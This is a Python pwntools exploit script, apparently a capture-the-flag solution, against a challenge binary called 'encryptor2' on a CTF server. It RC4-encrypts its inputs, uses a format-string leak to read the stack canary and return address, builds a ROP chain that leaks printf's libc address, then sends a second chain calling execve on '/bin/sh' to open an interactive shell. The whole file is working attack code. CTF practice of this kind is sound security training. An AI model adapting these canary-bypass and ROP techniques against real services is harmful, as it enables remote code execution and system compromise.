import sys
from Crypto.Cipher import ARC4
from pwn import *


KEY = b"AAABC"
OFFSET = 264
RET_ADDR_OFFSET = 1518

pop_rdi = 0x0000000000001653
pop2_rsi = 0x0000000000001651
ret = 0x000000000000101A


def enc(payload):
    rc4 = ARC4.new(KEY)
    ctxt = rc4.encrypt(payload)
    # assert b"\n" not in enc_payload
    # assert b"\0" not in enc_payload
    return ctxt


context.log_level = "error"
# context.log_level = "debug"

binary = ELF("../challenge/encryptor2")

if 1:
    # t = remote("127.0.0.1", 1234)
    t = remote("pwn.ingehack.ingeniums.club", 2003)
    libc = ELF("../challenge/libc-2.31.so")
else:
    t = process("../challenge/encryptor2")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    print(f"pid: {t.pid}")
    pause()

t.recvuntil("Key: \n")
t.sendline(b"AAABC")

payload = b"%73$p|%74$p|%75$p|#"
enc_payload = enc(payload)

t.recvuntil("Data: \n")
t.sendline(enc_payload)

leak = t.recvuntil(b"#").strip(b"#").split(b"|")
print(f"leak: {leak}")

canary = int(leak[0], 16)
rbp = int(leak[1], 16)
ret_addr = int(leak[2], 16)

print(f"canary:      0x{canary:016x}")
print(f"rbp:         0x{rbp:016x}")
print(f"ret_addr:    0x{ret_addr:016x}")
binary_base = ret_addr - RET_ADDR_OFFSET - 0x1000
print(f"binary_base: 0x{binary_base:016x}")


payload = b"A" * OFFSET
payload += p64(canary)
payload += p64(rbp)
payload += p64(binary_base + pop_rdi)
payload += p64(binary_base + binary.got["printf"])
payload += p64(binary_base + ret)
payload += p64(binary_base + binary.plt["printf"])
payload += p64(binary_base + binary.symbols["_start"])

print(len(payload))
enc_payload = enc(payload)

t.recvuntil("Data: \n")
t.sendline(enc_payload)

buff = t.recvuntil("Key: \n")
print(buff)

printf_libc = u64(buff.lstrip(b"A")[:6].ljust(8, b"\0"))
print(f"printf_libc: 0x{printf_libc:016x}")
libc_base = printf_libc - libc.symbols["printf"]
print(f"libc_base: 0x{libc_base:016x}")

# start again
t.sendline(b"AAABC")


payload = b"A" * OFFSET
payload += p64(canary)
# payload += p64(rbp)
payload += b"A" * 8
payload += p64(binary_base + pop_rdi)
payload += p64(libc_base + next(libc.search(b"/bin/sh")))
payload += p64(binary_base + pop2_rsi)
payload += p64(0)
payload += p64(0)
payload += p64(libc_base + libc.symbols["execve"])

print(len(payload))
enc_payload = enc(payload)

t.recvuntil("Data: \n")
t.sendline(enc_payload)

t.interactive()
